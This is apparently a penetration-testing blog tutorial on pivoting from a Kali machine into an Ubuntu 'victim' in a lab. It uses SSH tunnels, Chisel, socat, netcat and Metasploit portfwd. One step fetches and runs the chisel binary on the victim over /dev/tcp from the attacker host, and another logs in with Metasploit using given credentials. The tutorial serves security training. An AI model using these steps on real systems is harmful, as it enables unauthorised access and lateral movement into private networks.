---
title: "Basic Port Forwarding Techniques"
author:
  name: Miguel Guerrero
  link: https://mikemighthack.me
date: 2022-03-08 11:33:00 +0105
categories: [Tutorials, Port Forwarding]
tags: [ssh, chisel, socat, netcat, msf]
math: true
mermaid: true
---

In this post we will see different port forwarding tools and techniques.
To see the different examples, we will use the following fictitious scenario.

![image-center]({{ site.url }}{{ site.baseurl }}\assets\images\tutorials\PortForwarding\20220310123314.png){: .align-center}

Our attacking Kali machine (192.168.164.133) and our victim Ubuntu machine (192.168.164.130) which is running a python simple HTTP server only accessible locally. 

The different tools that we are going to see are:
 - SSH
- Chisel
- Socat
- Netcat
- Msfconsole / meterpreter

## SHH
We can pivot using ssh in three different ways:
 - SSH Local port forwarding
- SSH Remote port forwarding
- SSH Dynamic port forwarding (SOCKS)


### SSH Local port forwarding

![image-center]({{ site.url }}{{ site.baseurl }}\assets\images\tutorials\PortForwarding\20220310133017.png){: .align-center}

```bash
      root@kali:~$ ssh -L 9000:127.0.0.1:8000 ust@192.168.164.130
```

This command will make the remote web server accessible, on our localhost on port 9000.

### SSH Remote port forwarding

![image-center]({{ site.url }}{{ site.baseurl }}\assets\images\tutorials\PortForwarding\20220310132100.png){: .align-center}

```shell
    victim@ubuntu:~$ sudo ssh -R 9090:localhost:8000 kali@192.168.164.133
```

We have to run this command from the victim machine, once we have gained access to it. With this command, we will be able to access from our Kali to the remote application in our localhost, port 9090.

### SSH Dynamic port forwarding (SOCKS)

First we need to configure our proxychains file: **/etc/proxychains.conf**

![image-center]({{ site.url }}{{ site.baseurl }}\assets\images\tutorials\PortForwarding\20220310132643.png){: .align-center}

We set socks4 on port 9000.

Then we run the following ssh command:

```shell
    root@kali:~$ ssh -D 9000 victim@192.168.164.130
```

After that, we need to configure the proxy in our browser (in this case, using foxyproxy.) 

![image-center]({{ site.url }}{{ site.baseurl }}\assets\images\tutorials\PortForwarding\20220310133340.png){: .align-center}

We set the Proxy Type as **SOCKS4** and use the configuration we put in the proxychains.conf file.

Finally, we will be able to reach the remote HTTP server from our Kali as is it shown in the image below. 

![image-center]({{ site.url }}{{ site.baseurl }}\assets\images\tutorials\PortForwarding\20220310133601.png){: .align-center}


## Chisel

How to install and execute Chisel:

Kali machine:
``` shell
root@kali:~/tools$ git clone https://github.com/jpillora/chisel.git
root@kali:~/tools$ cd chisel
root@kali:~/tools/chisel$ go build –ldflags=“-s –w”
root@kali:~/tools/chisel$ upx brute chisel 
root@kali:~/tools/chisel$ nc -lvnp 6666 < chisel
root@kali:~/tools/chisel$ ./chisel server -p 8002 -reverse -v
```

Victim machine:

``` shell
ust@ubuntu:~/tmp$ cat < /dev/tcp/192.168.164.133/6666 > chisel
ust@ubuntu:~/tmp$ chmod 755 chisel
ust@ubuntu:~/tmp$ ./chisel client 192.168.164.133:8002 R:127.0.0.1:8000
```

![image-center]({{ site.url }}{{ site.baseurl }}\assets\images\tutorials\PortForwarding\20220310134836.png){: .align-center}

Then we will be able to reach the remote HTTP server in our localhost port 8000.

## Socat

```sh
root@kali:~/tools$ socat TCP-LISTEN:localport,fork,reuseaddr TCP:remoteIP:remoteport
root@kali:~/tools$ socat TCP-LISTEN:10000,fork,reuseaddr TCP:192.168.164.130:8000
```

## Netcat
```sh  
root@kali:~/tools$ mknod pivot p
root@kali:~/tools$ nc -l -p 12000 0<pivot | nc 192.168.164.130 8000 1>pivot
```

## Msfconsole / meterpreter

Use auxiliary/scanner/ssh/ssh_login module to create a session

```sh
root@kali:~/tools$ msfconsole
msf5 use auxiliary/scanner/ssh/ssh_login
msf5 auxiliary(scanner/ssh/ssh_login) > set rhosts 192.168.164.130
msf5 auxiliary(scanner/ssh/ssh_login) > set username victim
msf5 auxiliary(scanner/ssh/ssh_login) > set password pass
msf5 auxiliary(scanner/ssh/ssh_login) > exploit 
msf5 auxiliary(scanner/ssh/ssh_login) > sessions -l 
msf5 auxiliary(scanner/ssh/ssh_login) > sessions -u ‘id’
msf5 auxiliary(scanner/ssh/ssh_login) > sessions -i ‘id’
```

Once connected, use the meterpreter session opened and do the port forwarding:

```sh
meterpreter > portfwd -h
meterpreter > portfwd add -l 1234 -p 8000 -r 192.168.164.130
meterpreter > portfwd list
```

![image-center]({{ site.url }}{{ site.baseurl }}\assets\images\tutorials\PortForwarding\20220310135630.png){: .align-center}

## Practice
If you want to practice the techniques and tools explained in this post, you can make the following hack the box machines:

- Granny
- Grandpa
- Vault
- Reddish
